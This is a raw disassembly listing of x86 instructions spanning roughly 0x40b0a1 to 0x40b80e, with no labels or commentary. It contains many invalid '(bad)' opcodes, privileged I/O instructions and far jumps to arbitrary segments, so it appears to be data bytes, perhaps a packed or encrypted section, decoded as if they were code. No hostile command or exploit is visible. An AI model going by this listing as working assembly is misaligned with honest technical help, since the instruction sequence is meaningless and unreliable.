  40b0a1:	sbb    al,0xa8
  40b0a3:	xchg   esp,eax
  40b0a4:	jmp    0x69d8:0x3cc4cb54
  40b0ab:	ror    DWORD PTR [ecx+0x21917a94],1
  40b0b1:	jno    0x40b0d1
  40b0b3:	xchg   ebp,eax
  40b0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0b5:	je     0x40b104
  40b0b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0b8:	loope  0x40b05b
  40b0ba:	xor    al,0xe4
  40b0bc:	cmp    DWORD PTR [ecx+0x3f],eax
  40b0bf:	adc    al,0xd0
  40b0c1:	push   es
  40b0c2:	(bad)  
  40b0c3:	call   0xd7af22c3
  40b0c8:	push   edx
  40b0c9:	inc    esi
  40b0ca:	ins    BYTE PTR es:[edi],dx
  40b0cb:	(bad)  
  40b0cc:	xchg   ebp,eax
  40b0cd:	in     al,0xd1
  40b0cf:	ret    0x82dd
  40b0d2:	(bad)  
  40b0d3:	xchg   ecx,eax
  40b0d4:	iret   
  40b0d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0d6:	in     al,0x92
  40b0d8:	sbb    al,0xe7
  40b0da:	inc    esp
  40b0db:	lock or DWORD PTR [esi-0x1bd0c036],edi
  40b0e2:	jmp    0xd4d822cd
  40b0e7:	(bad)  
  40b0e8:	(bad)  
  40b0e9:	sub    al,BYTE PTR [eax+0x51f3f43]
  40b0ef:	es pop esi
  40b0f1:	pusha  
  40b0f2:	aaa    
  40b0f3:	sbb    ch,0x94
  40b0f6:	retf   
  40b0f7:	fcomp  DWORD PTR [ebp-0x24c74b21]
  40b0fd:	fst    QWORD PTR cs:[eax]
  40b100:	fs retf 0x9dd9
  40b104:	cwde   
  40b105:	xor    DWORD PTR [ebp+0x2f11407],edx
  40b10b:	jno    0x40b12d
  40b10d:	xchg   edx,eax
  40b10e:	test   DWORD PTR [ecx],edi
  40b110:	(bad)  
  40b111:	stos   DWORD PTR es:[edi],eax
  40b112:	imul   edi,DWORD PTR [ecx-0xbc25685],0xaaab9939
  40b11c:	xor    dl,bl
  40b11e:	pop    ss
  40b11f:	inc    eax
  40b120:	sub    DWORD PTR [ebx+0x4b],ebx
  40b123:	retf   0x7ed0
  40b126:	mov    cl,0xa
  40b128:	xchg   edi,eax
  40b129:	faddp  st(5),st
  40b12b:	repz xlat BYTE PTR ds:[ebx]
  40b12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b12e:	fnsave [ebp-0x25f6fdfa]
  40b134:	cvtps2pd xmm4,QWORD PTR [ebx+0x4a]
  40b138:	dec    esi
  40b139:	arpl   WORD PTR [esi],ax
  40b13b:	jo     0x40b0e8
  40b13d:	push   ebp
  40b13e:	cdq    
  40b13f:	aas    
  40b140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b141:	mov    ch,BYTE PTR [eax+0x6e]
  40b144:	outs   dx,BYTE PTR ds:[esi]
  40b145:	pop    esp
  40b146:	xchg   edi,eax
  40b147:	or     al,0x63
  40b149:	push   ds
  40b14a:	lods   eax,DWORD PTR ds:[esi]
  40b14b:	mov    ah,0x6e
  40b14d:	pop    edi
  40b14e:	popa   
  40b14f:	sub    ecx,DWORD PTR [ecx]
  40b151:	push   0x903d7b51
  40b156:	push   eax
  40b157:	dec    ebp
  40b158:	outs   dx,DWORD PTR ds:[esi]
  40b159:	xchg   ebx,eax
  40b15a:	mov    ds:0xcd715496,eax
  40b15f:	mov    esp,0xf0149143
  40b164:	ret    
  40b165:	inc    ebp
  40b166:	mov    WORD PTR [eax],?
  40b168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b16a:	ins    DWORD PTR es:[edi],dx
  40b16b:	adc    eax,0xa153fc40
  40b170:	inc    eax
  40b171:	mov    ds,WORD PTR [eax]
  40b173:	mov    ds,WORD PTR [edx-0x31]
  40b176:	in     eax,0x2a
  40b178:	mov    ds:0x3ebfa63e,al
  40b17d:	xchg   edx,eax
  40b17e:	cdq    
  40b17f:	and    BYTE PTR [ebx+0xd40152a],cl
  40b185:	and    dh,BYTE PTR [eax]
  40b187:	push   ebx
  40b188:	sahf   
  40b189:	ret    0x620c
  40b18c:	test   BYTE PTR [ecx],cl
  40b18e:	lea    edi,[esi+0x4d6845aa]
  40b194:	mov    BYTE PTR [eax-0x50464c3e],bl
  40b19a:	jmp    0xacef:0x602aba55
  40b1a1:	sub    DWORD PTR [esi+0x8c96c22],edx
  40b1a7:	inc    ecx
  40b1a8:	shl    DWORD PTR [edx+0x21],cl
  40b1ab:	and    al,BYTE PTR [edx+0x1c]
  40b1ae:	jb     0x40b1d2
  40b1b0:	and    DWORD PTR [ecx+edx*8],esi
  40b1b3:	nop
  40b1b4:	dec    eax
  40b1b5:	(bad)  
  40b1b6:	std    
  40b1b7:	pop    ds
  40b1b8:	in     eax,0x42
  40b1ba:	pop    es
  40b1bb:	aam    0x3c
  40b1bd:	gs jmp 0xb748fe6a
  40b1c3:	push   esp
  40b1c4:	cmp    BYTE PTR [edx+0x53],0x2e
  40b1c8:	mov    ecx,0x1a94b1ae
  40b1cd:	adc    BYTE PTR [eax-0x13ac182f],ch
  40b1d3:	(bad)  
  40b1d4:	inc    esp
  40b1d5:	repnz mov edi,0xd467fe2e
  40b1db:	adc    DWORD PTR [ecx-0x51],edi
  40b1de:	inc    esp
  40b1df:	outs   dx,BYTE PTR ds:[esi]
  40b1e0:	cmp    cl,bh
  40b1e2:	sbb    ebx,DWORD PTR [edi]
  40b1e4:	popa   
  40b1e5:	clc    
  40b1e6:	enter  0xc759,0xbb
  40b1ea:	cdq    
  40b1eb:	push   esi
  40b1ec:	cmp    ah,dl
  40b1ee:	mov    DWORD PTR [edi+0x13],ebp
  40b1f1:	or     BYTE PTR [edx-0x53e5d7a9],bl
  40b1f7:	mov    eax,ds:0xbf3c7dce
  40b1fc:	shl    BYTE PTR [ecx-0x7f],0x76
  40b200:	shr    DWORD PTR [eax+esi*2+0x151ed85d],1
  40b207:	mov    esp,0x4da6cc94
  40b20c:	outs   dx,DWORD PTR ds:[esi]
  40b20d:	in     eax,dx
  40b20e:	mov    ?,eax
  40b210:	(bad)  
  40b211:	stos   DWORD PTR es:[edi],eax
  40b212:	ja     0x40b1ab
  40b214:	jnp    0x40b25b
  40b216:	pop    esi
  40b217:	pusha  
  40b218:	xchg   ecx,eax
  40b219:	and    bl,BYTE PTR [ecx]
  40b21b:	dec    esp
  40b21c:	shl    BYTE PTR [edx+0x7450e2ec],1
  40b222:	and    DWORD PTR ds:0x30448e2b,ebx
  40b228:	cld    
  40b229:	xor    ah,0x98
  40b22c:	repnz and cl,al
  40b22f:	mov    ds:0x80ee6326,al
  40b234:	retf   0xc2a9
  40b237:	mov    esi,0xb3957c6b
  40b23c:	and    BYTE PTR [edx],ah
  40b23e:	inc    edx
  40b23f:	in     eax,0x67
  40b241:	xchg   esi,eax
  40b242:	jne    0x40b21e
  40b244:	out    dx,eax
  40b245:	jl     0x40b258
  40b247:	mov    esi,0xb6df7327
  40b24c:	scas   eax,DWORD PTR es:[edi]
  40b24d:	mov    ch,0xf4
  40b24f:	jns    0x40b26c
  40b251:	or     eax,0xa0b3fcbf
  40b256:	jnp    0x40b20d
  40b258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b259:	test   edi,edx
  40b25b:	xchg   ebx,eax
  40b25c:	sti    
  40b25d:	ret    0xd20d
  40b260:	inc    esi
  40b261:	out    dx,eax
  40b262:	pop    eax
  40b263:	pop    ecx
  40b264:	stos   BYTE PTR es:[edi],al
  40b265:	aas    
  40b266:	fimul  WORD PTR [ecx+ebx*1-0x5fbdfa35]
  40b26d:	mov    edi,0x1a0818ac
  40b272:	or     al,BYTE PTR [ecx-0xc]
  40b275:	test   ebx,esp
  40b277:	(bad)  
  40b279:	imul   ebx,DWORD PTR [edx+0x3da06fcc],0x7e
  40b280:	dec    ebx
  40b281:	repnz xchg edi,eax
  40b283:	mov    BYTE PTR [ebp-0x20764bce],dh
  40b289:	out    0x8d,al
  40b28b:	push   ds
  40b28c:	sub    esi,0x958bebdc
  40b292:	lods   eax,DWORD PTR ds:[esi]
  40b293:	push   edx
  40b294:	leave  
  40b295:	mov    ebp,0x146f06de
  40b29a:	add    eax,0xd7ecf88c
  40b29f:	(bad)  
  40b2a1:	ds inc esi
  40b2a3:	xchg   edx,eax
  40b2a4:	jmp    0xbac0:0x79ece13a
  40b2ab:	imul   esp,DWORD PTR [esi+0x2b296c5b],0xffffffe5
  40b2b2:	push   ds
  40b2b3:	pop    ss
  40b2b4:	mov    al,ds:0x1c7775d3
  40b2b9:	inc    ebx
  40b2ba:	xchg   ebx,eax
  40b2bb:	(bad)  
  40b2bc:	cld    
  40b2bd:	sub    eax,eax
  40b2bf:	inc    ebx
  40b2c0:	inc    ebx
  40b2c1:	retf   
  40b2c2:	dec    ebp
  40b2c3:	mov    cl,BYTE PTR [edi+0x77]
  40b2c6:	(bad)  
  40b2c7:	cmp    al,0xae
  40b2c9:	pusha  
  40b2ca:	jl     0x40b2b5
  40b2cc:	test   DWORD PTR [esi],edi
  40b2ce:	ss jg  0x40b29b
  40b2d1:	mov    cl,0xdf
  40b2d3:	pop    edi
  40b2d4:	pop    esi
  40b2d5:	mov    esp,0x963b5e90
  40b2da:	out    dx,al
  40b2db:	or     esp,ebp
  40b2dd:	add    esp,DWORD PTR [ebp+0x781bfcdd]
  40b2e3:	sub    DWORD PTR [ebx-0x71557b42],ecx
  40b2e9:	mov    al,ds:0xdd25cc8
  40b2ee:	dec    esi
  40b2ef:	xor    DWORD PTR [ebx+0x2d],edi
  40b2f2:	jecxz  0x40b2af
  40b2f4:	call   0x57ff519a
  40b2f9:	into   
  40b2fa:	xor    DWORD PTR [esi],edi
  40b2fc:	dec    ebp
  40b2fd:	stos   DWORD PTR es:[edi],eax
  40b2fe:	cmp    dh,BYTE PTR [ebx+0x49cb155e]
  40b304:	sub    eax,0x5f28577f
  40b309:	pop    edx
  40b30a:	push   edi
  40b30b:	outs   dx,DWORD PTR ds:[esi]
  40b30c:	ret    
  40b30d:	lds    esi,FWORD PTR [ebx]
  40b30f:	sub    BYTE PTR [edx+0x3b6b641f],ch
  40b315:	dec    esp
  40b316:	pop    ecx
  40b317:	retf   0x796
  40b31a:	xor    eax,0x6635786
  40b31f:	jle    0x40b31d
  40b321:	adc    BYTE PTR [ebx+0x71],al
  40b324:	jmp    0x40b353
  40b326:	mov    ds:0xa6219eb7,al
  40b32b:	jbe    0x40b389
  40b32d:	cmp    al,0xd8
  40b32f:	cli    
  40b330:	hlt    
  40b331:	mov    edi,0x98919938
  40b336:	xchg   ecx,eax
  40b337:	jp     0x40b2d8
  40b339:	xchg   esp,eax
  40b33a:	cmp    DWORD PTR [ebx+0x6b],ecx
  40b33d:	jl     0x40b32c
  40b33f:	cmc    
  40b340:	cld    
  40b341:	mul    BYTE PTR [esi-0x765439a3]
  40b347:	ja     0x40b2d1
  40b349:	mov    WORD PTR [esi],es
  40b34b:	out    dx,al
  40b34c:	mov    DWORD PTR [edi-0xa],edi
  40b34f:	xchg   edi,eax
  40b350:	xchg   ebx,eax
  40b351:	and    ecx,0xfd2ef157
  40b357:	(bad)  
  40b358:	pop    ds
  40b359:	out    dx,eax
  40b35a:	mul    DWORD PTR [ecx+0x320d12aa]
  40b360:	(bad)  
  40b362:	call   0xcd0c2069
  40b367:	pop    es
  40b368:	dec    ebp
  40b369:	call   0x6325f7c9
  40b36e:	frstor [ebx+0x3cff5cd1]
  40b374:	push   ds
  40b375:	xor    eax,0xea75fe71
  40b37a:	out    0x46,eax
  40b37c:	mov    ebp,0x1ef1c262
  40b381:	int3   
  40b382:	mov    ds:0x42d6801a,al
  40b387:	cmp    dl,BYTE PTR [edi]
  40b389:	cdq    
  40b38a:	and    eax,0x17bee705
  40b38f:	mov    BYTE PTR [esi-0xda54bde],0x92
  40b396:	pop    edi
  40b397:	xchg   ecx,eax
  40b398:	ins    DWORD PTR es:[edi],dx
  40b399:	mov    ecx,esp
  40b39b:	sub    BYTE PTR [esi+0x55],al
  40b39e:	adc    BYTE PTR [esi+0x6c72f9c7],al
  40b3a4:	pop    ss
  40b3a5:	jno    0x40b372
  40b3a7:	xchg   ebx,eax
  40b3a8:	xor    al,0x85
  40b3aa:	push   es
  40b3ab:	inc    ebx
  40b3ac:	or     eax,0x48e15036
  40b3b1:	lds    esp,FWORD PTR [esi]
  40b3b3:	xor    esp,ecx
  40b3b5:	and    BYTE PTR [ebp+eax*2-0x66],bl
  40b3b9:	ds aaa 
  40b3bb:	xor    cl,ch
  40b3bd:	test   eax,0x3beb58e5
  40b3c2:	lgs    esi,FWORD PTR [ebx-0x7431d98e]
  40b3c9:	aad    0xba
  40b3cb:	into   
  40b3cc:	mov    al,0x24
  40b3ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3cf:	add    cl,BYTE PTR [edi+0x61]
  40b3d2:	pop    eax
  40b3d3:	das    
  40b3d4:	retf   0xd549
  40b3d7:	push   edi
  40b3d8:	cwde   
  40b3d9:	int3   
  40b3da:	daa    
  40b3db:	mov    ch,bl
  40b3dd:	mov    bl,0x3
  40b3df:	mov    esi,DWORD PTR [edi+0x46]
  40b3e2:	pop    esp
  40b3e3:	jb     0x40b422
  40b3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e7:	gs loope 0x40b463
  40b3ea:	ror    esi,cl
  40b3ec:	inc    esi
  40b3ed:	(bad)  
  40b3ee:	adc    dh,ch
  40b3f0:	push   es
  40b3f1:	add    al,0x32
  40b3f3:	dec    ecx
  40b3f4:	ror    DWORD PTR [edx-0x3a2d02fb],1
  40b3fa:	mov    ds:0xb83eb4e7,al
  40b3ff:	xchg   ch,bl
  40b401:	adc    ecx,DWORD PTR [ebx-0x6a]
  40b404:	sbb    eax,0x21672160
  40b409:	pop    ebx
  40b40a:	jecxz  0x40b3c4
  40b40c:	inc    edx
  40b40d:	xor    ch,0x9f
  40b410:	lea    eax,[edx-0x6517cba5]
  40b416:	jno    0x40b427
  40b418:	or     edx,DWORD PTR [ebp-0x65]
  40b41b:	repz sbb eax,0xcc7afe3a
  40b421:	repz in al,0x5a
  40b424:	xchg   ebx,eax
  40b425:	pop    ecx
  40b426:	inc    eax
  40b427:	xchg   esi,eax
  40b428:	push   eax
  40b429:	ffreep st(6)
  40b42b:	cmp    esi,DWORD PTR [edx-0x49e710a1]
  40b431:	add    al,0x9d
  40b433:	mov    bh,0x37
  40b435:	mov    eax,ds:0xa786a81e
  40b43a:	bndldx (bad),[ecx]
  40b43d:	sub    al,0xa7
  40b43f:	outs   dx,BYTE PTR ds:[esi]
  40b440:	push   0xffffffd0
  40b442:	mov    dh,0xa4
  40b444:	cwde   
  40b445:	aam    0xe4
  40b447:	push   es
  40b448:	xlat   BYTE PTR ds:[ebx]
  40b449:	jb     0x40b4bf
  40b44b:	jge    0x40b3f5
  40b44d:	call   0xfd7d:0xffeb4790
  40b454:	push   DWORD PTR [edx-0x1d]
  40b457:	imul   edi,DWORD PTR [edx+0x17e19342],0x3fe4b165
  40b461:	mov    ecx,0x6fbcc491
  40b466:	push   0xd0fc87ae
  40b46b:	pop    esp
  40b46c:	or     dl,0xd3
  40b46f:	stc    
  40b470:	xor    ch,BYTE PTR [edx+0x13]
  40b473:	sub    DWORD PTR [ebp-0x7a65a89c],esi
  40b479:	(bad)  
  40b47a:	xor    al,BYTE PTR cs:[edi+0x2c]
  40b47e:	jo     0x40b48b
  40b480:	rcr    DWORD PTR [ecx-0x1b8de55b],1
  40b486:	jp     0x40b4cd
  40b488:	jno    0x40b465
  40b48a:	ret    0xbb8
  40b48d:	jne    0x40b421
  40b48f:	into   
  40b490:	into   
  40b491:	mov    WORD PTR [ebp-0x55],cs
  40b494:	in     eax,dx
  40b495:	(bad)  
  40b496:	mov    eax,ebx
  40b498:	scas   al,BYTE PTR es:[edi]
  40b499:	mov    ah,0xf5
  40b49b:	inc    esp
  40b49c:	retf   0xf5e0
  40b49f:	jmp    0x519c:0xbc2fa1cc
  40b4a6:	jno    0x40b45f
  40b4a8:	and    esp,edx
  40b4aa:	inc    ebp
  40b4ab:	adc    esp,DWORD PTR [ebx+0x228a2729]
  40b4b1:	jb     0x40b4b1
  40b4b3:	mov    ah,BYTE PTR [ecx+eax*4-0x73]
  40b4b7:	xchg   ebp,eax
  40b4b8:	push   ebx
  40b4b9:	js     0x40b4f6
  40b4bb:	ins    BYTE PTR es:[edi],dx
  40b4bc:	pop    ss
  40b4bd:	int3   
  40b4be:	mov    bl,0x36
  40b4c0:	mov    bl,BYTE PTR [esi-0x2d6ac637]
  40b4c6:	xchg   ebx,eax
  40b4c7:	aam    0x80
  40b4c9:	fs sbb al,0xac
  40b4cc:	or     eax,0xd6a62242
  40b4d1:	retf   0xeb66
  40b4d4:	jbe    0x40b4f3
  40b4d6:	inc    ebp
  40b4d7:	ror    BYTE PTR [ecx-0x75],cl
  40b4da:	stc    
  40b4db:	std    
  40b4dc:	push   esi
  40b4dd:	gs jae 0x40b460
  40b4e0:	retf   
  40b4e1:	xchg   BYTE PTR [ebx+0x308e96ba],ah
  40b4e7:	enter  0x20d4,0xd6
  40b4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4ec:	scas   eax,DWORD PTR es:[edi]
  40b4ed:	xchg   ecx,eax
  40b4ee:	dec    ecx
  40b4ef:	mov    bh,0x73
  40b4f1:	pop    es
  40b4f2:	xor    al,0x24
  40b4f4:	or     al,0xff
  40b4f6:	bound  ebp,QWORD PTR [ebx+ebp*8]
  40b4f9:	scas   eax,DWORD PTR es:[edi]
  40b4fa:	sub    al,0x46
  40b4fc:	scas   al,BYTE PTR es:[edi]
  40b4fd:	jo     0x40b54b
  40b4ff:	repz imul edx,DWORD PTR [ebx+0x7162ad5c],0x35917170
  40b50a:	add    eax,0xcad61874
  40b50f:	xchg   esi,eax
  40b510:	sbb    BYTE PTR [ebx+0x3066e98b],bh
  40b516:	sub    DWORD PTR [esi-0x35e54283],ebp
  40b51c:	jge    0x40b590
  40b51e:	out    0xac,eax
  40b520:	sub    eax,0xa482ec3f
  40b525:	mov    eax,0xd99a1c20
  40b52a:	ror    ebp,1
  40b52c:	mov    DWORD PTR [edx],ecx
  40b52e:	inc    ebx
  40b52f:	fsub   QWORD PTR [edx-0x10]
  40b532:	xor    al,0x53
  40b534:	cdq    
  40b535:	and    al,0xe
  40b537:	adc    ch,BYTE PTR [ecx]
  40b539:	sub    DWORD PTR [esp+eax*2-0x15],eax
  40b53d:	mov    bl,0x1f
  40b53f:	mov    ch,0x9b
  40b541:	jns    0x40b54e
  40b543:	ds ret 0x9bc2
  40b547:	jg     0x40b541
  40b549:	xchg   ecx,eax
  40b54a:	jmp    0x40b59b
  40b54c:	push   0xffffffd5
  40b54e:	outs   dx,BYTE PTR ds:[esi]
  40b54f:	or     ch,BYTE PTR [edi]
  40b551:	test   al,0xf9
  40b553:	sbb    bl,0x2a
  40b556:	std    
  40b557:	xor    eax,0xe7b6eaf2
  40b55c:	cmc    
  40b55d:	inc    edx
  40b55e:	mov    bl,0x54
  40b560:	or     DWORD PTR [ebx+0x28c8996],esi
  40b566:	push   0x17
  40b568:	dec    eax
  40b569:	pop    esp
  40b56a:	cld    
  40b56b:	lods   al,BYTE PTR ds:[esi]
  40b56c:	and    DWORD PTR ds:0x31b922f3,0x8bf5692f
  40b576:	add    BYTE PTR [ebp-0x71],cl
  40b579:	inc    ebx
  40b57a:	test   eax,0x42856d7b
  40b57f:	xchg   BYTE PTR [ebx+0x2462af46],cl
  40b585:	jo     0x40b5f3
  40b587:	data16 fidiv WORD PTR [edx+ecx*2-0x2c]
  40b58c:	jno    0x40b5b0
  40b58e:	neg    BYTE PTR [eax+ebp*2]
  40b591:	addr16 sub esi,0xf533c300
  40b598:	xlat   BYTE PTR ds:[ebx]
  40b599:	mul    BYTE PTR [esi-0x19929f80]
  40b59f:	loopne 0x40b5a0
  40b5a1:	mov    al,ds:0xff0e43b
  40b5a6:	ja     0x40b5d3
  40b5a8:	mov    al,ds:0x65c4d5e7
  40b5ad:	sub    al,0x64
  40b5af:	xor    eax,0x6c0a03f1
  40b5b4:	mov    dh,0xbf
  40b5b6:	adc    ch,BYTE PTR [esp+eax*1]
  40b5b9:	not    esi
  40b5bb:	in     eax,0xd6
  40b5bd:	jge    0x40b595
  40b5bf:	jecxz  0x40b572
  40b5c1:	stos   DWORD PTR es:[edi],eax
  40b5c2:	fild   QWORD PTR [ecx]
  40b5c4:	mov    ch,0x47
  40b5c6:	dec    edx
  40b5c7:	dec    esi
  40b5c8:	or     al,0x37
  40b5ca:	add    al,0x8
  40b5cc:	mov    WORD PTR [ebp+0x5c502a31],?
  40b5d2:	dec    ecx
  40b5d3:	dec    ecx
  40b5d4:	xchg   ebp,eax
  40b5d5:	jl     0x40b5d6
  40b5d7:	jb     0x40b564
  40b5d9:	xor    bl,BYTE PTR [edx-0x7a]
  40b5dc:	cmp    al,BYTE PTR [ebp+0x5]
  40b5df:	mov    ebx,DWORD PTR [ebx+eiz*8]
  40b5e2:	add    al,0x9d
  40b5e4:	sub    BYTE PTR [ecx],bl
  40b5e6:	call   0xade29658
  40b5eb:	jp     0x40b648
  40b5ed:	mov    ecx,0x98f93cdb
  40b5f2:	std    
  40b5f3:	(bad)  
  40b5f4:	mov    ch,0xd7
  40b5f6:	push   0x11
  40b5f8:	std    
  40b5f9:	mov    edi,0x5950540b
  40b5fe:	imul   esp,ebx,0xffffffd6
  40b601:	retf   
  40b602:	pop    edi
  40b603:	mov    ebp,0x3fdcea22
  40b608:	ja     0x40b67f
  40b60a:	les    ecx,FWORD PTR [eax]
  40b60c:	push   ebx
  40b60d:	and    eax,0xa1553144
  40b612:	jp     0x40b604
  40b614:	mov    ecx,0x25f6f320
  40b619:	(bad)  
  40b61a:	jns    0x40b620
  40b61c:	fwait
  40b61d:	adc    BYTE PTR [eax+edi*2],ch
  40b620:	repz sbb edx,DWORD PTR ds:0xa3790572
  40b627:	dec    eax
  40b628:	mov    bh,0x1e
  40b62a:	shl    ch,1
  40b62c:	aaa    
  40b62d:	xchg   ecx,eax
  40b62e:	and    DWORD PTR ss:[ecx],0xffffffce
  40b632:	mov    eax,ds:0x7665dd6a
  40b637:	scas   al,BYTE PTR es:[edi]
  40b638:	(bad)  
  40b639:	fisubr WORD PTR [ebp+eax*1+0xdc5b89d]
  40b640:	mov    ds:0xa269b2ac,al
  40b645:	stc    
  40b646:	je     0x40b6b6
  40b648:	mov    ds:0x84b49fab,al
  40b64d:	mov    cl,0x1c
  40b64f:	xor    al,0x28
  40b651:	mov    edx,0xbf8c9488
  40b656:	mov    bl,0x4d
  40b658:	cmp    al,BYTE PTR [edx+0x4c87a4d5]
  40b65e:	xor    BYTE PTR [edi+esi*1+0x54],0x91
  40b663:	lds    edi,FWORD PTR [edi]
  40b665:	cli    
  40b666:	pop    esi
  40b667:	adc    dh,bl
  40b669:	leave  
  40b66a:	add    DWORD PTR [edi-0x79],0xb0732088
  40b671:	mov    bl,0x17
  40b673:	push   esp
  40b674:	sbb    al,bl
  40b676:	cs pop edx
  40b678:	call   0x5c32857
  40b67d:	mov    ecx,0xd98e95df
  40b682:	push   0x23
  40b684:	xchg   ebx,eax
  40b685:	mov    eax,0x948354ff
  40b68a:	inc    ecx
  40b68b:	not    BYTE PTR ds:0x8764394f
  40b691:	sub    eax,0x6dd4670d
  40b696:	les    edi,FWORD PTR [eax]
  40b698:	cmp    al,0x98
  40b69a:	add    cl,bl
  40b69c:	pop    edi
  40b69d:	fbld   TBYTE PTR [ecx-0x25]
  40b6a0:	and    DWORD PTR [edx],ecx
  40b6a2:	and    eax,0xe44a0e3e
  40b6a7:	(bad)  
  40b6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6aa:	out    0x3d,al
  40b6ac:	add    al,0x9c
  40b6ae:	cmp    BYTE PTR [eax],ch
  40b6b0:	mov    edi,ss
  40b6b2:	xchg   ecx,eax
  40b6b3:	mov    ebx,0x528dd6bb
  40b6b8:	mov    cl,0x6d
  40b6ba:	sub    ch,BYTE PTR [ebx+0x37]
  40b6bd:	or     eax,0xb75cfe4d
  40b6c2:	sbb    ch,BYTE PTR [esi]
  40b6c4:	xchg   bl,dl
  40b6c6:	push   esi
  40b6c7:	mov    DWORD PTR [ebx+0x34],ebx
  40b6ca:	sbb    ebx,DWORD PTR [esi+0x71]
  40b6cd:	xchg   ebx,eax
  40b6ce:	sbb    esp,DWORD PTR [eax]
  40b6d0:	sti    
  40b6d1:	aam    0xe0
  40b6d3:	dec    eax
  40b6d4:	popf   
  40b6d5:	cmp    ch,BYTE PTR [ecx-0x682d6644]
  40b6db:	dec    ebx
  40b6dc:	cmp    esi,DWORD PTR [edi]
  40b6de:	icebp  
  40b6df:	jl     0x40b706
  40b6e1:	sar    BYTE PTR [edi],cl
  40b6e3:	xlat   BYTE PTR ds:[ebx]
  40b6e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6e5:	das    
  40b6e6:	jl     0x40b6e4
  40b6e8:	test   DWORD PTR [edi+0x324bc4cf],ecx
  40b6ee:	or     DWORD PTR [edx+0x36],eax
  40b6f1:	add    ah,BYTE PTR [edx-0x3b80a52f]
  40b6f7:	mov    esi,0xf15bd14e
  40b6fc:	sub    eax,0x8f566f6c
  40b701:	ss loope 0x40b75a
  40b704:	icebp  
  40b705:	mov    ds:0x856c9104,al
  40b70a:	jne    0x40b6c6
  40b70c:	mov    ecx,0x50f0581b
  40b711:	pop    es
  40b712:	cmp    ecx,edx
  40b714:	mov    BYTE PTR [ebx+ebp*2],dl
  40b717:	pusha  
  40b718:	ret    
  40b719:	add    eax,0xc5ad6a94
  40b71e:	or     edx,edx
  40b720:	(bad)  
  40b721:	stos   DWORD PTR es:[edi],eax
  40b722:	sub    ch,dl
  40b724:	adc    DWORD PTR [ecx+0x5d12af21],ecx
  40b72a:	dec    eax
  40b72b:	push   ebp
  40b72c:	ret    0x1739
  40b72f:	push   edx
  40b730:	lods   eax,DWORD PTR ds:[esi]
  40b731:	mov    bh,BYTE PTR [esi]
  40b733:	push   es
  40b734:	jecxz  0x40b775
  40b736:	pushf  
  40b737:	and    eax,0x6bf27aac
  40b73c:	repnz push 0x3a
  40b73f:	add    al,0xa7
  40b741:	loopne 0x40b6e4
  40b743:	jb     0x40b774
  40b745:	sbb    eax,DWORD PTR [esi]
  40b747:	lods   eax,DWORD PTR ds:[esi]
  40b748:	xor    cl,BYTE PTR [eax]
  40b74a:	scas   al,BYTE PTR es:[edi]
  40b74b:	(bad)  
  40b74d:	call   0x5adc:0x2ea68a43
  40b754:	mov    esp,0x588ca0e8
  40b759:	inc    edx
  40b75a:	xor    al,0x5
  40b75c:	push   ebp
  40b75d:	repz sub bl,al
  40b760:	test   eax,0x3f5fa744
  40b765:	and    BYTE PTR [eax+ecx*1-0x57],dl
  40b769:	cmp    eax,0xe700c2fe
  40b76e:	add    eax,0xc635da9f
  40b773:	mov    ch,0xd6
  40b775:	sub    ebp,DWORD PTR [eax+esi*8-0x6f]
  40b779:	inc    eax
  40b77a:	push   cs
  40b77b:	xchg   edi,eax
  40b77c:	cld    
  40b77d:	xor    DWORD PTR [edi+0x69f815e4],edx
  40b783:	adc    al,0x8f
  40b785:	xlat   BYTE PTR ds:[ebx]
  40b787:	icebp  
  40b788:	mov    ecx,DWORD PTR [eax]
  40b78a:	clc    
  40b78b:	jmp    0xf613:0x4f350027
  40b792:	mov    edx,0x6690c1c3
  40b797:	addr16 out dx,al
  40b799:	add    DWORD PTR [esi+edx*4],0x6c2b34a9
  40b7a0:	and    DWORD PTR [eax],esp
  40b7a2:	xchg   DWORD PTR [ecx-0x4b2ec487],esp
  40b7a8:	in     eax,dx
  40b7a9:	fwait
  40b7aa:	push   0x43c1e614
  40b7af:	(bad)  
  40b7b1:	and    eax,0xf288de41
  40b7b6:	lea    ebx,[ebp-0x5cf0a431]
  40b7bc:	rol    bl,cl
  40b7be:	fist   WORD PTR [edx-0x1ac3adfe]
  40b7c4:	mov    bh,0x28
  40b7c6:	jnp    0x40b761
  40b7c8:	jne    0x40b83c
  40b7ca:	les    edx,FWORD PTR [ebx]
  40b7cc:	inc    esp
  40b7cd:	inc    ebx
  40b7ce:	sbb    edi,DWORD PTR [edi-0xd]
  40b7d1:	xor    BYTE PTR [esi+ebx*1-0x3811be8],0x87
  40b7d9:	cmovb  esi,DWORD PTR [edx+edx*4-0x64]
  40b7de:	inc    ecx
  40b7df:	pop    esp
  40b7e0:	pop    ds
  40b7e1:	xchg   esi,eax
  40b7e2:	fwait
  40b7e3:	or     ah,dh
  40b7e5:	fmulp  st(2),st
  40b7e7:	fild   QWORD PTR [eax+0x5b5fa611]
  40b7ed:	pop    eax
  40b7ee:	jp     0x40b820
  40b7f0:	pop    ds
  40b7f1:	out    0xe1,eax
  40b7f3:	sbb    BYTE PTR [eax+0x33],0x78
  40b7f7:	adc    eax,0x273dc9e8
  40b7fc:	dec    esi
  40b7fd:	push   ss
  40b7fe:	dec    ebx
  40b7ff:	dec    eax
  40b800:	rcr    ch,1
  40b802:	or     al,0x95
  40b804:	int3   
  40b805:	dec    ebx
  40b806:	inc    ecx
  40b807:	dec    esi
  40b808:	xor    BYTE PTR [ebp-0x3a],dh
  40b80b:	sbb    DWORD PTR [ebx-0x7b],ebx
  40b80e:	mov    ch,BYTE PTR [edi+0x1e]
